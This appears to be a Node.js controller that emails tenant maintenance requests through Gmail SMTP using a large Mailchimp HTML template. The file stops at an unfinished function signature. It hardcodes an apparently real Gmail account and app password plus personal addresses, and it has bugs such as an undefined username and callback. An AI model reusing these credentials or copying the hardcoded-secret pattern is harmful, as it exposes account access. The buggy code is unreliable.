const config = require("../config/auth.config");
const db = require("../models");
const Maintenance = db.maintenance;
const MaintenanceCounter = db.maintenancecounter;
var jwt = require("jsonwebtoken");
var bcrypt = require("bcryptjs");
var nodemailer = require("nodemailer");
var smtpTransport = require("nodemailer-smtp-transport");
var handlebars = require("handlebars");
var fs = require("fs");
var moment = require("moment");
const { request } = require("https");
var multer = require('multer')
const Loggings=db.loggings



exports.sendmaintenancemail = (req, res) => {
  smtpTransport = nodemailer.createTransport(
    smtpTransport({
      host: "smtp.gmail.com",

      port: "587",
      auth: {
        user: "adegokeadeleke.ayo@gmail.com",
        pass: "alvvcakmxqbfgvfa",
      },
    })
  );
  var readHTMLFile = function (path, callback) {
    fs.readFile(path, { encoding: "utf-8" }, function (err, html) {
      if (err) {
        throw err;
        callback(err);
      } else {
        callback(null, html);
      }
    });
  };
  var a = `<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
  <head>
      <!-- NAME: FALL COLORS -->
      <!--[if gte mso 15]>
      <xml>
          <o:OfficeDocumentSettings>
          <o:AllowPNG/>
          <o:PixelsPerInch>96</o:PixelsPerInch>
          </o:OfficeDocumentSettings>
      </xml>
      <![endif]-->
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>*|MC:SUBJECT|*</title>
      
  <style type="text/css">
  p{
    margin:10px 0;
    padding:0;
  }
  table{
    border-collapse:collapse;
  }
  h1,h2,h3,h4,h5,h6{
    display:block;
    margin:0;
    padding:0;
  }
  img,a img{
    border:0;
    height:auto;
    outline:none;
    text-decoration:none;
  }
  body,#bodyTable,#bodyCell{
    height:100%;
    margin:0;
    padding:0;
    width:100%;
  }
  .mcnPreviewText{
    display:none !important;
  }
  #outlook a{
    padding:0;
  }
  img{
    -ms-interpolation-mode:bicubic;
  }
  table{
    mso-table-lspace:0pt;
    mso-table-rspace:0pt;
  }
  .ReadMsgBody{
    width:100%;
  }
  .ExternalClass{
    width:100%;
  }
  p,a,li,td,blockquote{
    mso-line-height-rule:exactly;
  }
  a[href^=tel],a[href^=sms]{
    color:inherit;
    cursor:default;
    text-decoration:none;
  }
  p,a,li,td,body,table,blockquote{
    -ms-text-size-adjust:100%;
    -webkit-text-size-adjust:100%;
  }
  .ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.ExternalClass span,.ExternalClass font{
    line-height:100%;
  }
  a[x-apple-data-detectors]{
    color:inherit !important;
    text-decoration:none !important;
    font-size:inherit !important;
    font-family:inherit !important;
    font-weight:inherit !important;
    line-height:inherit !important;
  }
  .templateContainer{
    max-width:600px !important;
  }
  a.mcnButton{
    display:block;
  }
  .mcnImage,.mcnRetinaImage{
    vertical-align:bottom;
  }
  .mcnTextContent{
    word-break:break-word;
  }
  .mcnTextContent img{
    height:auto !important;
  }
  .mcnDividerBlock{
    table-layout:fixed !important;
  }
/*
@tab Page
@section Heading 1
@style heading 1
*/
  h1{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-family:'Arvo', 'Courier', Georgia, serif;
    ;
              /*@editable*/ font-size:46px;
    /*@editable*/font-style:normal;
    /*@editable*/font-weight:normal;
    /*@editable*/line-height:150%;
    /*@editable*/letter-spacing:1px;
    /*@editable*/text-align:center;
  }
/*
@tab Page
@section Heading 2
@style heading 2
*/
  h2{
    /*@editable*/color:#222222;
    /*@editable*/font-family:'Lora', Georgia, 'Times New Roman', serif;
    /*@editable*/font-size:28px;
    /*@editable*/font-style:normal;
    /*@editable*/font-weight:bold;
    /*@editable*/line-height:200%;
    /*@editable*/letter-spacing:normal;
    /*@editable*/text-align:center;
  }
/*
@tab Page
@section Heading 3
@style heading 3
*/
  h3{
    /*@editable*/color:#444444;
    /*@editable*/font-family:'Lora', Georgia, 'Times New Roman', serif;
    /*@editable*/font-size:20px;
    /*@editable*/font-style:italic;
    /*@editable*/font-weight:normal;
    /*@editable*/line-height:200%;
    /*@editable*/letter-spacing:normal;
    /*@editable*/text-align:left;
  }
/*
@tab Page
@section Heading 4
@style heading 4
*/
  h4{
    /*@editable*/color:#3D3D3D;
    /*@editable*/font-family:'Lora', Georgia, 'Times New Roman', serif;
    /*@editable*/font-size:20px;
    /*@editable*/font-style:italic;
    /*@editable*/font-weight:normal;
    /*@editable*/line-height:125%;
    /*@editable*/letter-spacing:normal;
    /*@editable*/text-align:left;
  }
/*
@tab Header
@section Header Container Style
*/
  #templateHeader{
    /*@editable*/background-color:#521625;
    /*@editable*/background-image:url("https://mcusercontent.com/2af20051d35a2afd0081bed2a/images/9da69a28-537b-94e0-e318-76e1a28f1ab0.jpg");
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:99px;
    /*@editable*/padding-bottom:99px;
  }
/*
@tab Header
@section Header Interior Style
*/
  .headerContainer{
    /*@editable*/background-color:#521625;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:36px;
    /*@editable*/padding-bottom:36px;
  }
/*
@tab Header
@section Header Text
*/
  .headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-family:'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    /*@editable*/font-size:32px;
    /*@editable*/line-height:150%;
    /*@editable*/text-align:center;
  }
/*
@tab Header
@section Header Link
*/
  .headerContainer .mcnTextContent a,.headerContainer .mcnTextContent p a{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-weight:normal;
    /*@editable*/text-decoration:underline;
  }
/*
@tab Upper Body
@section Upper Body Container Style
*/
  #templateUpperBody{
    /*@editable*/background-color:#8B2A34;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:63px;
    /*@editable*/padding-bottom:63px;
  }
/*
@tab Upper Body
@section Upper Body Interior Style
*/
  .upperBodyContainer{
    /*@editable*/background-color:transparent;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:9px;
    /*@editable*/padding-bottom:27px;
  }
/*
@tab Upper Body
@section Upper Body Text
*/
  .upperBodyContainer .mcnTextContent,.upperBodyContainer .mcnTextContent p{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-family:'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    /*@editable*/font-size:20px;
    /*@editable*/line-height:150%;
    /*@editable*/text-align:left;
  }
/*
@tab Upper Body
@section Upper Body Link
*/
  .upperBodyContainer .mcnTextContent a,.upperBodyContainer .mcnTextContent p a{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-weight:normal;
    /*@editable*/text-decoration:underline;
  }
/*
@tab Middle Body
@section Middle Body Container Style
*/
  #templateMiddleBody{
    /*@editable*/background-color:#FFFFFF;
    /*@editable*/background-image:url("https://mcusercontent.com/2af20051d35a2afd0081bed2a/images/9da69a28-537b-94e0-e318-76e1a28f1ab0.jpg");
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:72px;
    /*@editable*/padding-bottom:54px;
  }
/*
@tab Middle Body
@section Middle Body Interior Style
*/
  .middleBodyContainer{
    /*@editable*/background-color:transparent;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:9px;
    /*@editable*/padding-bottom:27px;
  }
/*
@tab Middle Body
@section Middle Body Text
*/
  .middleBodyContainer .mcnTextContent,.middleBodyContainer .mcnTextContent p{
    /*@editable*/color:#404040;
    /*@editable*/font-family:Arial;
    /*@editable*/font-size:16px;
    /*@editable*/line-height:150%;
    /*@editable*/text-align:left;
  }
/*
@tab Middle Body
@section Middle Body Link
*/
  .middleBodyContainer .mcnTextContent a,.middleBodyContainer .mcnTextContent p a{
    /*@editable*/color:#B44444;
    /*@editable*/font-weight:normal;
    /*@editable*/text-decoration:underline;
  }
/*
@tab Lower Body
@section Lower Body Container Style
*/
  #templateLowerBody{
    /*@editable*/background-color:#521625;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:0px;
    /*@editable*/padding-bottom:0px;
  }
/*
@tab Lower Body
@section Lower Body Interior Style
*/
  .lowerBodyContainer{
    /*@editable*/background-color:transparent;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:9px;
    /*@editable*/padding-bottom:27px;
  }
/*
@tab Lower Body
@section Lower Body Text
*/
  .lowerBodyContainer .mcnTextContent,.lowerBodyContainer .mcnTextContent p{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-family:Arial;
    /*@editable*/font-size:16px;
    /*@editable*/line-height:150%;
    /*@editable*/text-align:center;
  }
/*
@tab Lower Body
@section Lower Body Link
*/
  .lowerBodyContainer .mcnTextContent a,.lowerBodyContainer .mcnTextContent p a{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-weight:normal;
    /*@editable*/text-decoration:underline;
  }
/*
@tab Footer
@section Footer Style
*/
  #templateFooter{
    /*@editable*/background-color:#521625;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:0px;
    /*@editable*/padding-bottom:0px;
  }
/*
@tab Footer
@section Footer Interior Style
*/
  .footerContainer{
    /*@editable*/background-color:transparent;
    /*@editable*/background-image:none;
    /*@editable*/background-repeat:no-repeat;
    /*@editable*/background-position:center;
    /*@editable*/background-size:cover;
    /*@editable*/border-top:0;
    /*@editable*/border-bottom:0;
    /*@editable*/padding-top:0;
    /*@editable*/padding-bottom:0;
  }
/*
@tab Footer
@section Footer Text
*/
  .footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-family:Arial;
    /*@editable*/font-size:12px;
    /*@editable*/line-height:150%;
    /*@editable*/text-align:center;
  }
/*
@tab Footer
@section Footer Link
*/
  .footerContainer .mcnTextContent a,.footerContainer .mcnTextContent p a{
    /*@editable*/color:#FFFFFF;
    /*@editable*/font-weight:normal;
    /*@editable*/text-decoration:underline;
  }
@media only screen and (max-width: 480px){
  .columnWrapper{
    max-width:100% !important;
    width:100% !important;
  }

}	@media only screen and (max-width: 480px){
  #templateHeader{
    padding-right:18px !important;
    padding-left:18px !important;
  }

}	@media only screen and (max-width: 480px){
  body,table,td,p,a,li,blockquote{
    -webkit-text-size-adjust:none !important;
  }

}	@media only screen and (max-width: 480px){
  body{
    width:100% !important;
    min-width:100% !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnRetinaImage{
    max-width:100% !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImage{
    width:100% !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCaptionBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcnImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionRightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRightImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCardRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImageCardRightImageContentContainer{
    max-width:100% !important;
    width:100% !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnBoxedTextContentContainer{
    min-width:100% !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImageGroupContent{
    padding:9px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter .mcnTextContent{
    padding-top:9px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCaptionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-child .mcnTextContent{
    padding-top:18px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImageCardBottomImageContent{
    padding-bottom:9px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImageGroupBlockInner{
    padding-top:0 !important;
    padding-bottom:0 !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImageGroupBlockOuter{
    padding-top:9px !important;
    padding-bottom:9px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnTextContent,.mcnBoxedTextContentColumn{
    padding-right:18px !important;
    padding-left:18px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
    padding-right:18px !important;
    padding-bottom:0 !important;
    padding-left:18px !important;
  }

}	@media only screen and (max-width: 480px){
  .mcpreview-image-uploader{
    display:none !important;
    width:100% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Heading 1
*/
  h1{
    /*@editable*/font-size:34px !important;
    /*@editable*/line-height:150% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Heading 2
*/
  h2{
    /*@editable*/font-size:26px !important;
    /*@editable*/line-height:125% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Heading 3
*/
  h3{
    /*@editable*/font-size:20px !important;
    /*@editable*/line-height:200% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Heading 4
*/
  h4{
    /*@editable*/font-size:18px !important;
    /*@editable*/line-height:150% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Boxed Text
*/
  .mcnBoxedTextContentContainer .mcnTextContent,.mcnBoxedTextContentContainer .mcnTextContent p{
    /*@editable*/font-size:18px !important;
    /*@editable*/line-height:200% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Header Text
*/
  .headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
    /*@editable*/font-size:30px !important;
    /*@editable*/line-height:150% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Upper Body Text
*/
  .upperBodyContainer .mcnTextContent,.upperBodyContainer .mcnTextContent p{
    /*@editable*/font-size:18px !important;
    /*@editable*/line-height:150% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Middle Body Text
*/
  .middleBodyContainer .mcnTextContent,.middleBodyContainer .mcnTextContent p{
    /*@editable*/font-size:16px !important;
    /*@editable*/line-height:150% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Lower Body Text
*/
  .lowerBodyContainer .mcnTextContent,.lowerBodyContainer .mcnTextContent p{
    /*@editable*/font-size:16px !important;
    /*@editable*/line-height:150% !important;
  }

}	@media only screen and (max-width: 480px){
/*
@tab Mobile Styles
@section Footer Text
*/
  .footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
    /*@editable*/font-size:14px !important;
    /*@editable*/line-height:150% !important;
  }

}</style></head>
  <body>
      <!--*|IF:MC_PREVIEW_TEXT|*-->
      <!--[if !gte mso 9]><!----><span class="mcnPreviewText" style="display:none; font-size:0px; line-height:0px; max-height:0px; max-width:0px; opacity:0; overflow:hidden; visibility:hidden; mso-hide:all;">*|MC_PREVIEW_TEXT|*</span>
      <!--<![endif]-->
      <!--*|END:IF|*-->
      <center>
          <table align="center" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" id="bodyTable">
              <tr>
                  <td align="center" valign="top" id="bodyCell">
                      <!-- BEGIN TEMPLATE // -->
                      <table border="0" cellpadding="0" cellspacing="0" width="100%">
                          <tr>
                              <td align="center" valign="top" id="templateHeader" data-template-container>
                                  <!--[if (gte mso 9)|(IE)]>
                                  <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                  <tr>
                                  <td align="center" valign="top" width="600" style="width:600px;">
                                  <![endif]-->
                                  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                      <tr>
                                          <td valign="top" class="headerContainer"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnImageBlock" style="min-width:100%;">
  <tbody class="mcnImageBlockOuter">
          <tr>
              <td valign="top" style="padding:9px" class="mcnImageBlockInner">
                  <table align="left" width="100%" border="0" cellpadding="0" cellspacing="0" class="mcnImageContentContainer" style="min-width:100%;">
                      <tbody><tr>
                          <td class="mcnImageContent" valign="top" style="padding-right: 9px; padding-left: 9px; padding-top: 0; padding-bottom: 0; text-align:center;">
                              
                                  
                                      <img align="center" alt="" src="https://mcusercontent.com/2af20051d35a2afd0081bed2a/images/41a784c5-b61a-3b50-91b3-c84f1d0eb235.png" width="564" style="max-width:842px; padding-bottom: 0; display: inline !important; vertical-align: bottom;" class="mcnImage">
                                  
                              
                          </td>
                      </tr>
                  </tbody></table>
              </td>
          </tr>
  </tbody>
</table></td>
                                      </tr>
                                  </table>
                                  <!--[if (gte mso 9)|(IE)]>
                                  </td>
                                  </tr>
                                  </table>
                                  <![endif]-->
                              </td>
                          </tr>
                          <tr>
                              <td align="center" valign="top" id="templateUpperBody" data-template-container>
                                  <!--[if (gte mso 9)|(IE)]>
                                  <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                  <tr>
                                  <td align="center" valign="top" width="600" style="width:600px;">
                                  <![endif]-->
                                  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                      <tr>
                                          <td valign="top" class="upperBodyContainer"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnTextBlock" style="min-width:100%;">
  <tbody class="mcnTextBlockOuter">
      <tr>
          <td valign="top" class="mcnTextBlockInner" style="padding-top:9px;">
              <!--[if mso]>
      <table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
      <tr>
      <![endif]-->
        
      <!--[if mso]>
      <td valign="top" width="600" style="width:600px;">
      <![endif]-->
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="max-width:100%; min-width:100%;" width="100%" class="mcnTextContentContainer">
                  <tbody><tr>
                      
                      <td valign="top" class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;">
                      
                          <h1>Maintenance Request</h1>

                      </td>
                  </tr>
              </tbody></table>
      <!--[if mso]>
      </td>
      <![endif]-->
              
      <!--[if mso]>
      </tr>
      </table>
      <![endif]-->
          </td>
      </tr>
  </tbody>
</table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnDividerBlock" style="min-width:100%;">
  <tbody class="mcnDividerBlockOuter">
      <tr>
          <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 27px 18px 0px;">
              <table class="mcnDividerContent" border="0" cellpadding="0" cellspacing="0" width="100%" style="min-width:100%;">
                  <tbody><tr>
                      <td>
                          <span></span>
                      </td>
                  </tr>
              </tbody></table>
<!--            
              <td class="mcnDividerBlockInner" style="padding: 18px;">
              <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
-->
          </td>
      </tr>
  </tbody>
</table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnTextBlock" style="min-width:100%;">
  <tbody class="mcnTextBlockOuter">
      <tr>
          <td valign="top" class="mcnTextBlockInner" style="padding-top:9px;">
              <!--[if mso]>
      <table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
      <tr>
      <![endif]-->
        
      <!--[if mso]>
      <td valign="top" width="600" style="width:600px;">
      <![endif]-->
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="max-width:100%; min-width:100%;" width="100%" class="mcnTextContentContainer">
                  <tbody><tr>
                      
                      <td valign="top" class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;">
                      
                          my glass broke<br>
&nbsp;
                      </td>
                  </tr>
              </tbody></table>
      <!--[if mso]>
      </td>
      <![endif]-->
              
      <!--[if mso]>
      </tr>
      </table>
      <![endif]-->
          </td>
      </tr>
  </tbody>
</table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnDividerBlock" style="min-width:100%;">
  <tbody class="mcnDividerBlockOuter">
      <tr>
          <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 54px 18px 0px;">
              <table class="mcnDividerContent" border="0" cellpadding="0" cellspacing="0" width="100%" style="min-width:100%;">
                  <tbody><tr>
                      <td>
                          <span></span>
                      </td>
                  </tr>
              </tbody></table>
<!--            
              <td class="mcnDividerBlockInner" style="padding: 18px;">
              <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
-->
          </td>
      </tr>
  </tbody>
</table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnButtonBlock" style="min-width:100%;">
  <tbody class="mcnButtonBlockOuter">
      <tr>
          <td style="padding-top:0; padding-right:18px; padding-bottom:18px; padding-left:18px;" valign="top" align="center" class="mcnButtonBlockInner">
              <table border="0" cellpadding="0" cellspacing="0" class="mcnButtonContentContainer" style="border-collapse: separate !important; border-radius: 0px;">
                  <tbody>
                      <tr>
                          <td align="center" valign="middle" class="mcnButtonContent" style="font-family: Arial; font-size: 20px; padding: 15px;">
                              <a class="mcnButton " title="Close the Ticket" href="https://upbeat-volhard-556413.netlify.app/#/" target="_self" style="font-weight: bold;letter-spacing: normal;line-height: 100%;text-align: center;text-decoration: none;color: #FFFFFF;">Close the Ticket</a>
                          </td>
                      </tr>
                  </tbody>
              </table>
          </td>
      </tr>
  </tbody>
</table></td>
                                      </tr>
                                  </table>
                                  <!--[if (gte mso 9)|(IE)]>
                                  </td>
                                  </tr>
                                  </table>
                                  <![endif]-->
                              </td>
                          </tr>
                          <tr>
                              <td align="center" valign="top" id="templateMiddleBody" data-template-container>
                                  <!--[if (gte mso 9)|(IE)]>
                                  <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                  <tr>
                                  <td align="center" valign="top" width="600" style="width:600px;">
                                  <![endif]-->
                                  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                      <tr>
                                          <td valign="top" class="middleBodyContainer"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnDividerBlock" style="min-width:100%;">
  <tbody class="mcnDividerBlockOuter">
      <tr>
          <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 36px 18px 0px;">
              <table class="mcnDividerContent" border="0" cellpadding="0" cellspacing="0" width="100%" style="min-width:100%;">
                  <tbody><tr>
                      <td>
                          <span></span>
                      </td>
                  </tr>
              </tbody></table>
<!--            
              <td class="mcnDividerBlockInner" style="padding: 18px;">
              <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
-->
          </td>
      </tr>
  </tbody>
</table></td>
                                      </tr>
                                  </table>
                                  <!--[if (gte mso 9)|(IE)]>
                                  </td>
                                  </tr>
                                  </table>
                                  <![endif]-->
                              </td>
                          </tr>
                          <tr>
                              <td align="center" valign="top" id="templateLowerBody" data-template-container>
                                  <!--[if (gte mso 9)|(IE)]>
                                  <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                  <tr>
                                  <td align="center" valign="top" width="600" style="width:600px;">
                                  <![endif]-->
                                  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                      <tr>
                                          <td valign="top" class="lowerBodyContainer"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnDividerBlock" style="min-width:100%;">
  <tbody class="mcnDividerBlockOuter">
      <tr>
          <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 9px 18px 0px;">
              <table class="mcnDividerContent" border="0" cellpadding="0" cellspacing="0" width="100%" style="min-width:100%;">
                  <tbody><tr>
                      <td>
                          <span></span>
                      </td>
                  </tr>
              </tbody></table>
<!--            
              <td class="mcnDividerBlockInner" style="padding: 18px;">
              <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
-->
          </td>
      </tr>
  </tbody>
</table></td>
                                      </tr>
                                  </table>
                                  <!--[if (gte mso 9)|(IE)]>
                                  </td>
                                  </tr>
                                  </table>
                                  <![endif]-->
                              </td>
                          </tr>
                          <tr>
                              <td align="center" valign="top" id="templateFooter" data-template-container>
                                  <!--[if (gte mso 9)|(IE)]>
                                  <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
                                  <tr>
                                  <td align="center" valign="top" width="600" style="width:600px;">
                                  <![endif]-->
                                  <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
                                      <tr>
                                          <td valign="top" class="footerContainer"><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnTextBlock" style="min-width:100%;">
  <tbody class="mcnTextBlockOuter">
      <tr>
          <td valign="top" class="mcnTextBlockInner" style="padding-top:9px;">
              <!--[if mso]>
      <table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
      <tr>
      <![endif]-->
        
      <!--[if mso]>
      <td valign="top" width="600" style="width:600px;">
      <![endif]-->
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="max-width:100%; min-width:100%;" width="100%" class="mcnTextContentContainer">
                  <tbody><tr>
                      
                      <td valign="top" class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;">
                      
                          <a href="*|ARCHIVE|*" target="blank">view this email in your browser</a><br>
                      </td>
                  </tr>
              </tbody></table>
      <!--[if mso]>
      </td>
      <![endif]-->
              
      <!--[if mso]>
      </tr>
      </table>
      <![endif]-->
          </td>
      </tr>
  </tbody>
</table><table border="0" cellpadding="0" cellspacing="0" width="100%" class="mcnTextBlock" style="min-width:100%;">
  <tbody class="mcnTextBlockOuter">
      <tr>
          <td valign="top" class="mcnTextBlockInner" style="padding-top:9px;">
              <!--[if mso]>
      <table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
      <tr>
      <![endif]-->
        
      <!--[if mso]>
      <td valign="top" width="600" style="width:600px;">
      <![endif]-->
              <table align="left" border="0" cellpadding="0" cellspacing="0" style="max-width:100%; min-width:100%;" width="100%" class="mcnTextContentContainer">
                  <tbody><tr>
                      
                      <td valign="top" class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;">
                      
                          <em>Copyright © 2021 Al-Jaber, All rights reserved.</em><br>
<br>
&nbsp;
                      </td>
                  </tr>
              </tbody></table>
      <!--[if mso]>
      </td>
      <![endif]-->
              
      <!--[if mso]>
      </tr>
      </table>
      <![endif]-->
          </td>
      </tr>
  </tbody>
</table></td>
                                      </tr>
                                  </table>
                                  <!--[if (gte mso 9)|(IE)]>
                                  </td>
                                  </tr>
                                  </table>
                                  <![endif]-->
                              </td>
                          </tr>
                      </table>
                      <!-- // END TEMPLATE -->
                  </td>
              </tr>
          </table>
      </center>
  </body>
</html>`;
  readHTMLFile("htmltemplate.html", function (err, html) {
    var template = handlebars.compile(a);
    var replacements = {
      usrname: username,
      msg: req.body.message,
    };
    var htmlToSend = template(replacements);
    var mailOptions = {
      from: "tenants@aljaberqatar.com",
      to: [
        "gokeayomide.tolu@gmail.com",
        "tenants@aljaberqatar.com",
        "ayomide.adegoke@adroitsolutionsltd.com",
      ],
      subject: "Maintenace Request---" + username,
      html: htmlToSend,
      attachments: [
        {
          // filename and content type is derived from path
          path: "Tenants Master Sheet (1).xlsx",
        },
      ],
    };
    smtpTransport.sendMail(mailOptions, function (error, response) {
      if (error) {
        console.log(error);
        callback(error);
      }
    });
  });
};
const sendmaintenancemail = (username, message) => {
  smtpTransport = nodemailer.createTransport(
    smtpTransport({
      host: "smtp.gmail.com",

      port: "587",
      auth: {
        user: "adegokeadeleke.ayo@gmail.com",
        pass: "alvvcakmxqbfgvfa",
      },
    })
  );
  

var from = `Sung Park <i@gmail.com>`

var mail = {
            from: from,
            to: "gokeayomide.tolu@gmail.com",
            subject: `Consultation: New client`,
            html: `<h1>New client for kitomba</h1>
            <ul>
                <li>Firstname: </li>
                <li>Lastname: </li>
                <li>Phone: </li>
                <li>Mail: </li>
                <li>Address: </li>
                <li>Suburb: </li>
                <li>State: </li>
                <li>Postal code: </li>
            </ul>`
        }


smtpTransport.sendMail(mail, function (error, response) {
          if (error) {
            console.log(error);
            callback(error);
          }
        });
        console.log('done')


// let from = `Consultation <i***@gmail.com>`


};

const sendMails = (emailName,emailSubject,emailBody,emailLists) => {
